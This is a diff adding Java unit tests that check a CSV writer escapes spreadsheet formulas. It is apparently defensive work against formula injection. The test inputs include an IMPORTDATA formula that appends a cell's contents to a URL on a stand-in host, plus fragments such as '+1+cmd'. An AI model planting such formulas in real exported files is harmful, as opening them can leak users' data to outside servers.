@@ -40,6 +40,43 @@ class CsvTableTest {
     }
 
     @Test
+    void aValueASpreadsheetWouldRunIsWrittenAsText() {
+        CsvTable table = new CsvTable(List.of("A"), ";");
+
+        assertEquals("\"'=IMPORTDATA(\"\"https://example.com/?\"\"&A1)\"", table.field("=IMPORTDATA(\"https://example.com/?\"&A1)"));
+        assertEquals("'+1+cmd", table.field("+1+cmd"));
+        assertEquals("'-2+3", table.field("-2+3"));
+        assertEquals("'@SUM(A1)", table.field("@SUM(A1)"));
+        assertEquals("'\t=1", table.field("\t=1"));
+        assertEquals("\"'\r=1\"", table.field("\r=1"));
+        assertEquals("a=b", table.field("a=b"));
+    }
+
+    @Test
+    void plainNumbersAreLeftAlone() {
+        CsvTable table = new CsvTable(List.of("A"), ";");
+
+        assertEquals("-5", table.field("-5"));
+        assertEquals("+1.5", table.field("+1.5"));
+        assertEquals("-12,5%", table.field("-12,5%"));
+    }
+
+    @Test
+    void onlyFormulaColumnsKeepTheirFormulas() {
+        CsvTable table = new CsvTable(List.of("Name", "Link"), ";").formulaColumns("Link")
+            .addRow(List.of("=HYPERLINK(\"https://example.com\", \"me\")", "=HYPERLINK(\"https://discord.com/x\", \"View\")"));
+
+        assertEquals("Name;Link\n"
+            + "\"'=HYPERLINK(\"\"https://example.com\"\", \"\"me\"\")\";"
+            + "\"=HYPERLINK(\"\"https://discord.com/x\"\", \"\"View\"\")\"\n", table.toCsv());
+    }
+
+    @Test
+    void aFormulaColumnMustBeAHeader() {
+        assertThrows(IllegalArgumentException.class, () -> new CsvTable(List.of("A"), ";").formulaColumns("B"));
+    }
+
+    @Test
     void aMissingValueIsEmpty() {
         CsvTable table = new CsvTable(List.of("A", "B"), ",").addRow(Arrays.asList("one", null));
 
